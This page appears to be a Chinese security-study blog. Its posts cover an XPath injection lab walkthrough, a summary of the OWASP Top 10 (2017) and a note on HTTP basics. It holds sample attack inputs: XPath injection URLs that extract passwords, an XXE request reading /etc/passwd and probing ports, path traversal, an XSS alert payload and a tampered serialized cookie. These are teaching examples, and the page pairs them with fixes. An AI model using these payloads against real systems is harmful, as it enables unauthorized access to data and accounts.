<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;data&gt;</span><br><span class="line">&lt;users&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">&lt;name&gt;hacker&lt;/name&gt;</span><br><span class="line">&lt;message&gt;Hello hacker&lt;/message&gt;</span><br><span class="line">&lt;password&gt;pentesterlab&lt;/password&gt;</span><br><span class="line">&lt;/user&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">&lt;name&gt;admin&lt;/name&gt;</span><br><span class="line">&lt;message&gt;Hello admin&lt;/message&gt;</span><br><span class="line">&lt;password&gt;s3cr3tP4ssw0rd&lt;/password&gt;</span><br><span class="line">&lt;/user&gt;</span><br><span class="line">&lt;/users&gt;</span><br><span class="line">&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>提取出关键的xpath语句：$xpath = “users/user/name[.=’”.$_GET[‘name’].”‘]/parent::*/message”;然后尝试注入该xpath语句，其中注释符使用%00：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.189.128/xml/example2.php?name=1&#x27; and 1=1]%00</span><br><span class="line">http://192.168.189.128/xml/example2.php?name=1&#x27; or 1]%00</span><br><span class="line"></span><br><span class="line">$xpath = &quot;users/user/name[.=&#x27;1&#x27; and 1=1]%00&#x27;]/parent::*/message</span><br></pre></td></tr></table></figure></li>
<li><p>接着，查看是否存在子节点,发现没有子节点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.189.128/xml/example2.php?name=1&#x27; or 1]/child::node()%00</span><br></pre></td></tr></table></figure></li>
<li><p>查询当前节点兄弟节点的所有数据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.189.128/xml/example2.php?name=1&#x27; or 1]/parent::*/child::node()%00</span><br></pre></td></tr></table></figure></li>
<li><p>查询密码字段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.189.128/xml/example2.php?name=1&#x27; or 1]/parent::*/password%00</span><br></pre></td></tr></table></figure></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/25/OWASP%20TOP10/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/111.jpg">
      <meta itemprop="name" content="t2ee">
      <meta itemprop="description" content="选择有时候比努力更重要">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="t2ee的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/25/OWASP%20TOP10/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-05-25 17:01:30" itemprop="dateCreated datePublished" datetime="2021-05-25T17:01:30+08:00">2021-05-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-03-24 10:03:09" itemprop="dateModified" datetime="2021-03-24T10:03:09+08:00">2021-03-24</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="A1-2017-注入"><a href="#A1-2017-注入" class="headerlink" title="A1:2017-注入"></a>A1:2017-注入</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>将不受信任的数据作为命令或查询的一部分发送到解析器时，会产生诸如SQL注入、NoSQL注入、OS</p>
<p>注入和LDAP注入的注入缺陷。攻击者的恶意数据可以诱使解析器在没有适当授权的情况下执行非预</p>
<p>期命令或访问数据。</p>
<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ul>
<li><p>猜解后台数据库，这是利用最多的方式，盗取网站的敏感信息。</p>
</li>
<li><p>绕过认证，列如绕过验证登录网站后台。</p>
</li>
<li><p>注入可以借助数据库的存储过程进行提权等操作。</p>
</li>
</ul>
<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>SQL注入针对数据库的：联合（union）注入、报错注入、时间盲注</p>
<p>OS注入针对操作系统：可以删除整个系统文件</p>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><ul>
<li><p>最佳选择是使用安全的API，完全避免使用解释器，或提供参数化界面的接口，或迁移到ORM或实体框架</p>
</li>
<li><p>使用白名单来规范化的输入验证方法</p>
</li>
<li><p>对参数进行校验，可以通过正则匹配或限制长度、过滤特殊字符等</p>
</li>
<li><p>查询中使用LIMIT和其他SQL语句进行控制，防止在SQL注入时泄露大量记录。 </p>
</li>
</ul>
<h1 id="A2-2017-失效的身份认证"><a href="#A2-2017-失效的身份认证" class="headerlink" title="A2:2017-失效的身份认证"></a>A2:2017-失效的身份认证</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>与认证和会话管理相关的应用程序功能往往得不到正确实施，导致攻击者能够破译密码、密钥或会话令牌，或者利用其它开发缺陷来暂时性或永久性冒充其他用户的身份。</p>
<p>1）不安全的密码存储（包括明文、可逆加密的密码和弱散列密码，例如使用MD5/SHA1或不加盐）可能导致泄漏。</p>
<p>2）应用会话超时设置不正确。用户使用公共计算机访问应用程序。用户直接关闭浏览器选项卡就离开，而不是选择“注销”。攻击者一小时后使用同一个浏览器浏览网页，而当前用户状态仍然是经过身份验证的。</p>
<h2 id="危害-1"><a href="#危害-1" class="headerlink" title="危害"></a>危害</h2><ul>
<li><p>可能导致部分甚至全部账户遭受攻击，攻击者一旦成功，攻击者能执行受害用户的任何操作。因此管理员账户、特权账户是常见的攻击目标</p>
</li>
<li><p>可能会导致放任洗钱、社会安全欺诈以及用户身份盗窃、泄露法律高度保护的敏感信息。</p>
</li>
</ul>
<h2 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h2><p>攻击者可以获得数百万的有效用户名和密码组合，包括证书填充、默认的管理帐户列表、自动的暴力破解和字典攻击工具，以及高级的GPU破解工具。会话管理攻击很容易被理解，尤其是没有过期的会话密匙。</p>
<h2 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h2><ul>
<li><p>分区公共区域和受限区域：站点的公共区域允许任何人用户进行匿名访问，受限区域只能接受特定用户的访问</p>
</li>
<li><p>cookie内容进行加密</p>
</li>
<li><p>可以设置锁定账户策略</p>
</li>
<li><p>设置密码和会话的有效期，并使用强密码（密码必须是数字和字母的组合）</p>
</li>
<li><p>账号密码以密文形式传输</p>
</li>
</ul>
<h1 id="A3-2017-敏感数据泄露"><a href="#A3-2017-敏感数据泄露" class="headerlink" title="A3:2017-敏感数据泄露"></a>A3:2017-敏感数据泄露</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>许多Web应用程序和API都无法正确保护敏感数据，例如：财务数据、医疗数据和PII数据。攻击者可</p>
<p>以通过窃取或修改未加密的数据来实施信用卡诈骗、身份盗窃或其他犯罪行为。未加密的敏感数据</p>
<p>容易受到破坏，因此，我们需要对敏感数据加密，这些数据包括：传输过程中的数据、存储的数据</p>
<p>以及浏览器的交互数据。</p>
<h2 id="危害-2"><a href="#危害-2" class="headerlink" title="危害"></a>危害</h2><ul>
<li><p>用户人身财产受到威胁</p>
</li>
<li><p>威胁国家和公司安全</p>
</li>
<li><p>用户思想容易被裹挟，（分析用户行为和思维并向用户精准投放广告）</p>
</li>
</ul>
<h2 id="利用方式-2"><a href="#利用方式-2" class="headerlink" title="利用方式"></a>利用方式</h2><p>攻击者不是直接攻击密码，而是在传输过程中或从客户端（例如：浏览器）窃取密钥、发起中间人攻击，或从服务器端窃取明文数据。这通常需要手动攻击。通过使用图形处理单元（GPU），早前检索的密码数据库可能被暴力破解。</p>
<h2 id="修复方案-2"><a href="#修复方案-2" class="headerlink" title="修复方案"></a>修复方案</h2><ul>
<li>对系统处理、存储或传输的数据分类，并根据分类进行访问控制。</li>
<li>对重要数据进行加密存放，数据在传输过程中使用密文进行传输。</li>
<li>及时清理没有用的敏感数据，只能使用指定用户访问敏感数据。</li>
</ul>
<h1 id="A4-2017-XML外部实体（XXE）"><a href="#A4-2017-XML外部实体（XXE）" class="headerlink" title="A4:2017-XML外部实体（XXE）"></a>A4:2017-XML外部实体（XXE）</h1><h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><p>许多较早的或配置错误的XML处理器评估了XML文件中的外部实体引用。攻击者可以利用外部实体窃</p>
<p>取使用URI文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施拒绝服务攻</p>
<p>击。</p>
<blockquote>
<p><strong>XML用于标识电子文件使其具有结构性的标识语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声名、DTD文档类型定义、文档元素。</strong></p>
</blockquote>
<h2 id="危害-3"><a href="#危害-3" class="headerlink" title="危害"></a>危害</h2><p>XXE缺陷可用于提取数据、执行远程服务器请求、扫描内部系统、执行拒绝服务攻击和其他攻击。</p>
<h2 id="利用方式-3"><a href="#利用方式-3" class="headerlink" title="利用方式"></a>利用方式</h2><p>通常攻击者会将payload注入XML文件中，一旦文件被执行，将会读取服务器上的本地文件，并对内网发起访问扫描内部网络端口。换而言之，XXE是一种从本地到达各种服务的方法。此外，在一定程度上这也可能帮助攻击者绕过防火墙规则过滤或身份验证检查。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST /vulnerable HTTP/1.1</span><br><span class="line">Host: www.test.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Referer: https://test.com/test.html</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 294</span><br><span class="line">Cookie: mycookie=cookies;</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"> </span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:8080&quot; &gt;]&gt;//内网端口的探测</span><br><span class="line">//&lt;!ENTITY xxe SYSTEM=&quot;file:///etc/passwd&quot;]&gt; 利用file://、php://等伪协议读取本地文件</span><br><span class="line">&lt;catalog&gt;</span><br><span class="line">   &lt;core id=&quot;test101&quot;&gt;</span><br><span class="line">      &lt;author&gt;John, Doe&lt;/author&gt;</span><br><span class="line">      &lt;title&gt;I love XML&lt;/title&gt;</span><br><span class="line">      &lt;category&gt;Computers&lt;/category&gt;</span><br><span class="line">      &lt;price&gt;9.99&lt;/price&gt;</span><br><span class="line">      &lt;date&gt;2018-10-01&lt;/date&gt;</span><br><span class="line">      &lt;description&gt;&amp;xxe;&lt;/description&gt;</span><br><span class="line">   &lt;/core&gt;</span><br><span class="line">&lt;/catalog&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="修复方案-3"><a href="#修复方案-3" class="headerlink" title="修复方案"></a>修复方案</h2><ul>
<li><p>使用开发语言提供的禁用外部实体的方法。</p>
</li>
<li><p>过滤用户提交的XML数据。</p>
</li>
<li><p>尽可能使用简单的数据格式（如：JSON），避免对敏感数据进行序列化。</p>
</li>
</ul>
<h1 id="A5-2017-失效的访问控制"><a href="#A5-2017-失效的访问控制" class="headerlink" title="A5:2017-失效的访问控制"></a>A5:2017-失效的访问控制</h1><h2 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h2><p>未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数</p>
<p>据，例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。</p>
<h2 id="危害-4"><a href="#危害-4" class="headerlink" title="危害"></a>危害</h2><p>攻击者可以冒充用户、管理员或拥有特权的用户，或者创建、访问、更新或删除任何记录。</p>
<h2 id="利用方式-4"><a href="#利用方式-4" class="headerlink" title="利用方式"></a>利用方式</h2><p>通过修改URL，内部应用程序状态，或者HTML页面绕过访问控制检查，或者使用自定义API 攻击工具。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/getUserProfile.jsp?item=../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<p>权限绕过（水平越权）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">例子</span><br><span class="line">下面例子的url是管理员彩蛋的一部分：</span><br><span class="line">https://www.example.com/admin/addUser.jsp </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">访问这个页面你的HTTP请求如下：</span><br><span class="line">POST /admin/addUser.jsp HTTP/1.1</span><br><span class="line">Host: www.example.com</span><br><span class="line">[other HTTP headers]</span><br><span class="line"></span><br><span class="line">userID=fakeuser&amp;role=3&amp;group=grp001</span><br><span class="line">如果一个非管理员用户发送这个请求到服务器，会执行什么操作，在权限验证和访问控制不理想的情况下，非管理员用户通过构造管理员相应操作的数据包，也能达到管理员的权限。如增加/删除用户等。</span><br></pre></td></tr></table></figure>

<h2 id="修复方案-4"><a href="#修复方案-4" class="headerlink" title="修复方案"></a>修复方案</h2><ul>
<li>除公有资源外，其他资源默认情况下拒绝访问。</li>
<li>使用一次性的访问控制机制，并在整个应用程序中不断重用它们。</li>
<li>建立访问控制模型以强制执行所有权记录，而不是接受用户创建、读取、更新或删除的任何记录。</li>
<li>当用户注销后，服务器上的JWT令牌应失效。</li>
</ul>
<h1 id="A6-2017-安全配置错误"><a href="#A6-2017-安全配置错误" class="headerlink" title="A6:2017-安全配置错误"></a>A6:2017-安全配置错误</h1><h2 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h2><p>安全配置错误是最常见的安全问题，这通常是由于不安全的默认配置、不完整的临时配置、开源云</p>
<p>存储、错误的 HTTP 标头配置以及包含敏感信息的详细错误信息所造成的。因此，我们不仅需要对所</p>
<p>有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级它们。</p>
<h2 id="危害-5"><a href="#危害-5" class="headerlink" title="危害"></a>危害</h2><p>攻击者能够通过未修复的漏洞、访问默认账户、不再使用的页面、未受保护的文件和目录等来取得对系统的未授权的访问或了解。</p>
<h2 id="利用方式-5"><a href="#利用方式-5" class="headerlink" title="利用方式"></a>利用方式</h2><p>攻击者能够通过未修复的漏洞、访问默认账户、不再使用的页面、未受保护的文件和目录等来取得对系统的未授权的访问或了解。</p>
<h2 id="修复方案-5"><a href="#修复方案-5" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.自动化安装部署</p>
<p>2.及时了解并部署每个环节的软件更新和补丁信息</p>
<p>3.实施漏洞扫描和安全审计</p>
<h1 id="A7-2017-跨站脚本（XSS）"><a href="#A7-2017-跨站脚本（XSS）" class="headerlink" title="A7:2017-跨站脚本（XSS）"></a>A7:2017-跨站脚本（XSS）</h1><h2 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h2><p>当应用程序的新网页中包含不受信任的、未经恰当验证或转义的数据时，或者使用可以创建 HTML或</p>
<p>JavaScript 的浏览器 API 更新现有的网页时，就会出现 XSS 缺陷。XSS 让攻击者能够在受害者的浏览器</p>
<p>中执行脚本，并劫持用户会话、破坏网站或将用户重定向到恶意站点。</p>
<h2 id="危害-6"><a href="#危害-6" class="headerlink" title="危害"></a>危害</h2><p>攻击者在受害者浏览器中执行脚本以劫持用户会话，插入恶意内容，重定向用户，使用恶意软件劫持用户浏览器等</p>
<h2 id="利用方式-6"><a href="#利用方式-6" class="headerlink" title="利用方式"></a>利用方式</h2><ul>
<li>很多输入框是可以随意输入内容的，特别是一些文本编辑框里面，可以输入如<script>alert(‘OK ‘);</script>这样的内容，如果在一些首页出现很多这样内容，而又不经过处理，那么页面就不断的弹框，更有甚者，在里面执行一个无限循环的脚本函数，直到页面耗尽资源为止。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://example.com/test.php?param=&lt;script&gt;alert(&#x27;OK &#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>XSS代码攻击还可能会窃取或操纵客户会话和 Cookie，它们可能用于模仿合法用户，从而使黑客能够以该用户身份查看或变更用户记录以及执行事务。</li>
<li>为了窃取密码，攻击者可以将XSS与“钓鱼”结合。实现思路：利用JavaScript在当前页面上“画出”一个伪造的登录框，当用户在登录框中输入用户名和密码后，其密码将被发送到黑客的服务器上。</li>
</ul>
<h2 id="修复方案-6"><a href="#修复方案-6" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.验证输入</p>
<p>2.编码输出（用来确保输入的字符被视为数据，而不是作为html被浏览器所解析）</p>
<p>3.根据HTML输出的上下文（包括：主体、属性、JavaScript、CSS或URL）对所有不可信的HTTP请求数据进行恰当的转义 。</p>
<h1 id="A8-2017-不安全的反序列化"><a href="#A8-2017-不安全的反序列化" class="headerlink" title="A8:2017-不安全的反序列化"></a>A8:2017-不安全的反序列化</h1><h2 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h2><p>不安全的反序列化会导致远程代码执行。即使反序列化缺陷不会导致远程代码执行，攻击者也可以</p>
<p>利用它们来执行攻击，包括：重播攻击、注入攻击和特权升级攻击。</p>
<h2 id="危害-7"><a href="#危害-7" class="headerlink" title="危害"></a>危害</h2><p>可能导致远程代码执行攻击</p>
<h2 id="利用方式-7"><a href="#利用方式-7" class="headerlink" title="利用方式"></a>利用方式</h2><ul>
<li><p>php反序列化漏洞又称对象注入，可能会导致远程代码执行(RCE)，漏洞前提是unserialize函数的变量可控，php文件中存在可利用的类，类中有魔术方法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使用PHP对象序列化来保存一个“超级”cookie。该cookie包含了用户的用户ID、角色、密码哈希和其他状态：</span><br><span class="line">a:4:&#123;i:0;i:132;i:1;s:7:&quot;Mallory&quot;;i:2;s:4:&quot;user&quot;;i:3;s:32:&quot;b6a8b3bea87fe0e05022f8f3c88bc960&quot;;&#125;</span><br><span class="line"></span><br><span class="line">攻击者更改序列化对象以授予自己为admin权限：</span><br><span class="line">a:4:&#123;i:0;i:1;i:1;s:5:&quot;Alice&quot;;i:2;s:5:&quot;admin&quot;;i:3;s:32:&quot;b6a8b3bea87fe0e05022f8f3c88bc960&quot;;&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>利用Apache Commons Collections实现远程代码执行，Apache Commons Collections中实现的一些类可以被反序列化用来实现任意代码执行。WebLogic、WebSphere、这些应用的反序列化漏洞能够得以利用，就是依靠了Apache Commons Collections。</p>
</li>
<li><p>2017年有报道，黑客利用WebLogic 反序列化漏洞（CVE-2017-3248）和WebLogic WLS 组件漏洞（CVE-2017-10271）对企业服务器发起大范围远程攻击，有大量企业的服务器被攻陷。</p>
</li>
</ul>
<h2 id="修复方案-7"><a href="#修复方案-7" class="headerlink" title="修复方案"></a>修复方案</h2><p>1、php编码中对参数进行处理，使用更安全的函数。</p>
<p>2、限制或监视来自于容器或服务器传入和传出的反序列化网络连接。</p>
<p>3、如果可能，隔离运行那些在低特权环境中反序列化的代码。</p>
<p>4、执行完整性检查，如：任何序列化对象的数字签名，防止恶意对象创建或数据篡改。</p>
<h1 id="A9-2017-使用含有已知漏洞的组件"><a href="#A9-2017-使用含有已知漏洞的组件" class="headerlink" title="A9:2017-使用含有已知漏洞的组件"></a>A9:2017-使用含有已知漏洞的组件</h1><h2 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h2><p>组件（例如：库、框架和其他软件模块）拥有和应用程序相同的权限。如果应用程序中含有已知漏</p>
<p>洞的组件被攻击者利用，可能会造成严重的数据丢失或服务器接管。同时，使用含有已知漏洞的组</p>
<p>件的应用程序和API可能会破坏应用程序防御、造成各种攻击并产生严重影响。</p>
<h2 id="危害-8"><a href="#危害-8" class="headerlink" title="危害"></a>危害</h2><p>应用程序使用带有已知漏洞的组件会破坏应用程序防御系统，可能导致严重的数据丢失或服务器接管</p>
<h2 id="利用方式-8"><a href="#利用方式-8" class="headerlink" title="利用方式"></a>利用方式</h2><p>程序中含有已知漏洞的组件被攻击者利用</p>
<h2 id="修复方案-8"><a href="#修复方案-8" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.识别正在使用的组件和版本，包括所有的依赖</p>
<p>2.更新组件或引用的库文件到最新</p>
<p>3.建立安全策略来管理组件的使用</p>
<h1 id="A10-2017-不足的日志记录和监控"><a href="#A10-2017-不足的日志记录和监控" class="headerlink" title="A10:2017-不足的日志记录和监控"></a>A10:2017-不足的日志记录和监控</h1><h2 id="原理-9"><a href="#原理-9" class="headerlink" title="原理"></a>原理</h2><p>不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持</p>
<p>续性或转向更多系统，以及篡改、提取或销毁数据。大多数缺陷研究显示，缺陷被检测出的时间超</p>
<p>过200天，且通常通过外部检测方检测，而不是通过内部流程或监控检测。</p>
<h2 id="危害-9"><a href="#危害-9" class="headerlink" title="危害"></a>危害</h2><p>攻击者能够进一步攻击系统、保持持续性或转向更多系统，以及篡改、提取或销毁数据。</p>
<h2 id="利用方式-9"><a href="#利用方式-9" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="修复方案-9"><a href="#修复方案-9" class="headerlink" title="修复方案"></a>修复方案</h2><ul>
<li>确保所有登录、访问控制失败、输入验证失败能够被记录到日志中去，并保留足够的用户上下文信息，以识别可疑或恶意帐户，并为后期取证预留足够时间。</li>
<li>确保日志以一种能被集中日志管理解决方案使用的形式生成确保高额交易有完整性控制的审计信息，以防止篡改或删除，例如审计信息保存在只能进行记录增加的数据库表中。</li>
<li>建立有效的监控和告警机制，使可疑活动在可接受的时间内被发现和应对。</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/25/HW/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/111.jpg">
      <meta itemprop="name" content="t2ee">
      <meta itemprop="description" content="选择有时候比努力更重要">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="t2ee的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/25/HW/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-05-25 17:01:30" itemprop="dateCreated datePublished" datetime="2021-05-25T17:01:30+08:00">2021-05-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-03-19 16:42:17" itemprop="dateModified" datetime="2021-03-19T16:42:17+08:00">2021-03-19</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="一、资产梳理"><a href="#一、资产梳理" class="headerlink" title="一、资产梳理"></a>一、资产梳理</h1><h1 id="二、防微杜渐、减少供给面"><a href="#二、防微杜渐、减少供给面" class="headerlink" title="二、防微杜渐、减少供给面"></a>二、防微杜渐、减少供给面</h1><h1 id="三、优化完善纵深防御体系"><a href="#三、优化完善纵深防御体系" class="headerlink" title="三、优化完善纵深防御体系"></a>三、优化完善纵深防御体系</h1><h1 id="四、构建内网的主动防御能力"><a href="#四、构建内网的主动防御能力" class="headerlink" title="四、构建内网的主动防御能力"></a>四、构建内网的主动防御能力</h1><h1 id="五、提升基于情报的精准防御能力"><a href="#五、提升基于情报的精准防御能力" class="headerlink" title="五、提升基于情报的精准防御能力"></a>五、提升基于情报的精准防御能力</h1><h1 id="八、高效协同、改进联防联控能力"><a href="#八、高效协同、改进联防联控能力" class="headerlink" title="八、高效协同、改进联防联控能力"></a>八、高效协同、改进联防联控能力</h1><h1 id="九、构建溯源反制能力"><a href="#九、构建溯源反制能力" class="headerlink" title="九、构建溯源反制能力"></a>九、构建溯源反制能力</h1><h2 id="天眼"><a href="#天眼" class="headerlink" title="天眼"></a>天眼</h2><p>传感器</p>
<p>分析平台：源IP、目的IP、源端口、目的端口、协议</p>
<p>沙箱</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/25/http%E5%9F%BA%E7%A1%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/111.jpg">
      <meta itemprop="name" content="t2ee">
      <meta itemprop="description" content="选择有时候比努力更重要">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="t2ee的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/25/http%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-05-25 17:01:30" itemprop="dateCreated datePublished" datetime="2021-05-25T17:01:30+08:00">2021-05-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-03-20 00:27:45" itemprop="dateModified" datetime="2021-03-20T00:27:45+08:00">2021-03-20</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>浏览器输入URL到返回页面的整个过程</p>
</blockquote>
<ul>
<li>输入URL</li>
<li>DNS解析</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 浏览器会缓存DNS一段时间,如果有缓存，直接返回ip</span><br><span class="line"><span class="number">2.</span> 缓存中无法找到IP，浏览器会进行一个系统调用，查询hosts文件。如果找到，直接返回IP。</span><br><span class="line"><span class="number">3.</span> 查找路由器缓存，路由器一般有自己的缓存</span><br><span class="line"><span class="number">4.</span> 对本地DNS服务器进行递归查询，先向根域名服务器查询，然后逐级往下查询，直到找到为止</span><br></pre></td></tr></table></figure>

<ul>
<li>发起HTTP”三次握手“，建立TCP/IP连接</li>
<li>TCP/IP连接建立起来后，浏览器就可以向服务器发送http请求，比如说使用get方式请求一个域名</li>
<li>服务器处理请求，返回响应的结果</li>
<li>浏览器拿到代码后，经过解析、渲染等</li>
</ul>
